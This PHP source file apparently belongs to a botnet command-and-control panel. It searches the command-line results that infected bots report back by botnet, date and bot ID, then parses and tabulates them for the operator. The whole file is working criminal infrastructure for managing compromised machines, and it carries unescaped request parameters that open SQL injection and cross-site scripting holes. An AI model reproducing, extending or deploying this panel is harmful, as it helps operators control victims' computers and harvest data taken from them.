<?php if(!defined('__CP__'))die();

# read the list of favorites
$favorite_reports_list = array();
if ($s = @file_get_contents($favorite_reports = $config['reports_path'].'/favorite.dat'))
	if ($s = @unserialize($s))
		$favorite_reports_list = $s;

$favorite_bots = array();
$fb_R = mysql_query('SELECT bot_id, comment FROM `botnet_list` WHERE `comment`<>"";');
while (!is_bool($fb_r = mysql_fetch_row($fb_R)))
	$favorite_bots[  $fb_r[0]  ] = $fb_r[1];


ThemeBegin(LNG_REPORTS, 0, getBotJsMenu('botmenu'), 0);
echo
str_replace('{WIDTH}', '100%', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS.THEME_STRING_SPACE), THEME_DIALOG_TITLE);

echo '<tr><td>';

$do_search = (count($_GET) > 1);

# Botnets
if (!isset($_GET['botnet'])) $_GET['botnet'] = '';

$botnets = array();
$botnet_select_options = '<option value="*">-- Any --</option>';
$R = mysql_query('SELECT DISTINCT `botnet` FROM `botnet_list` ORDER BY `botnet` ASC;');
while (!is_bool($r = mysql_fetch_row($R))) {
	$botnets[] = $botnet = $r[0];
	$botnet_select_options .= sprintf('<option value="%s" %s>%s</option>', $botnet, $botnet==$_GET['botnet']?'selected':'' ,$botnet);
	}

# Dates
if (!isset($_GET['date0'])) $_GET['date0'] = date('ymd');
if (!isset($_GET['date1'])) $_GET['date1'] = date('ymd');

$dates = array();
$date_select_options = array(  0 => '', 1 => '' );
$R = mysql_query("SHOW TABLES LIKE 'botnet_reports_%';");
while (!is_bool($r = mysql_fetch_row($R))){
	$dates[] = $date = substr($r[0], 15);
	$date_select_options[0] .= sprintf('<option value="%s" %s>%s</option>', $date, $date==$_GET['date0']?'selected':'' , $date);
	$date_select_options[1] .= sprintf('<option value="%s" %s>%s</option>', $date, $date==$_GET['date1']?'selected':'' , $date);
	}

# BotID
if (!isset($_GET['botid'])) $_GET['botid'] = '*';
if (!isset($_GET['fmask'])) $_GET['fmask'] = '*';

# Form
echo <<<HTML
<form method=GET><input type=hidden name=m value="{$_GET['m']}" />
<table>
	<tr><th>Botnet</th>
		<td><select name="botnet" style="width: 300px;">{$botnet_select_options}</select></td></tr>
	<tr><th>Date</th>
			<td>
			<select name="date0" style="width: 140px;">{$date_select_options[0]}</select> — 
			<select name="date1" style="width: 140px;">{$date_select_options[1]}</select></td></tr>
	<tr><th>BotID</th>
		<td><input type="text" name="botid" value="{$_GET['botid']}" style="width: 285px;" /></td></tr>
	</table>
<i></i>
<input type="submit" value="Search" />
</form>

HTML;
echo '</td></tr><tr><td>';

if ($do_search){
	require 'system/reports_cmdlist_cmdprocessor.php';
	# Dates list
	$date0 = array_search($_GET['date0'], $dates);
	$date1 = array_search($_GET['date1'], $dates);
	if ($date0 === FALSE) $date0 = 0;
	if ($date1 === FALSE) $date1 = count($dates)-1;
	
	$dates_list = array_slice($dates, $date0, $date1-$date0+1);
	
	# Query stub
	$botnet_like	= str_replace(array('*', '_'), array('%', '\\_'), $_GET['botnet']);
	$botid_like	= str_replace(array('*', '_'), array('%', '\\_'), $_GET['botid']);
	$query = 'SELECT `botnet`, `bot_id`, `context`, `id` FROM `botnet_reports_{date}` WHERE `type`='.BLT_COMMANDLINE_RESULT.' AND `botnet` LIKE "'.$botnet_like.'" AND `bot_id` LIKE "'.$botid_like.'" ORDER BY `rtime` DESC;';
	
	# Request, process
	$cmd_columns = array(); // array( column name => is long)
	$cmd_results = array(); // array( CmdResult[] )
	$cmd_parsed = array(); // array( array( column name => value ) )
	foreach($dates_list as $date)
		if ($R = mysql_query($q = str_replace('{date}', $date, $query)))
			while (!is_bool($r = mysql_fetch_row($R))){
				$cmd_results[] = $results = process_command_list($r[3], $r[2]);
				$parsed = array(
					-1 => in_array($r[3].'@botnet_reports_'.$date, $favorite_reports_list), # is favorite
					0 => sprintf(
						'<a href="?m=reports_db&t=%s&id=%d" target="_blank">%d</a>', 
						$date, 
						$r[3],
						$r[3]
						),
					1 => $r[1],
					//1 => sprintf('<a href="?botsaction=fullinfoss&bots[]=%s" target="_blank">%s</a>', $r[1], $r[1]),
					);
				foreach($results as $result)
					foreach ($result->parse() as $c => $v){
						$cmd_columns[$c] = $result instanceof LongCmdResult;
						$parsed[$c] = $v;
						}
				$cmd_parsed[] = $parsed;
				}
	
	# Display
	echo '<table border=1 id="cmdlist">';
	echo '<THEAD><tr>', '<th>#</th>', '<th>BotID</th>'; foreach($cmd_columns as $c => $islong) echo "<th>$c</th>"; echo '</tr></THEAD>';
	echo '<TBODY>';
	foreach($cmd_parsed as $row){
		print '<tr>';
		echo '<td'.( $row[-1]?' class="favorite"':'' ).'>', $row[0], '</td>';
		echo '<td>', botPopupMenu($row[1], 'botmenu', isset($favorite_bots[$row[1]])?$favorite_bots[$row[1]]:''), '</td>';
		foreach ($cmd_columns as $cname => $islong){
			print '<td>';
			if (!isset($row[$cname]) || !$row[$cname]){
				print ' </td>';
				continue;
				}
			if ($islong) print '<a class="tdexpand" href="#">[ + ]</a><div class="tdexpand">';
			if (isset($row[$cname]))
				if (is_scalar($row[$cname]))
					print htmlspecialchars($row[$cname]);
					else {
					print '<ol>';
					foreach($row[$cname] as $l)
						echo "<li>", htmlspecialchars($l), "</li>";
					print '</ol>';
					}
			print '</td>';
			}
		print '</tr>';
		}
	echo '</TBODY>';
	echo '</table>';
	
	echo <<<HTML
<style>
#cmdlist { font-family: monospace; white-space: pre-line; vertical-align: top; }
#cmdlist td div.tdexpand { display: none; }

.bot_a .favorite { padding: 3px; }
</style>
<script>
$('#cmdlist a.tdexpand').click(function(){
	$(this).hide().parent().find('div').show();
	return false;
	});
$('#cmdlist div.tdexpand').click(function(){
	$(this).hide().parent().find('a').show();
	return false;
	});
</script>
HTML;
	}

echo '</td></tr>';
  THEME_DIALOG_END;
ThemeEnd();
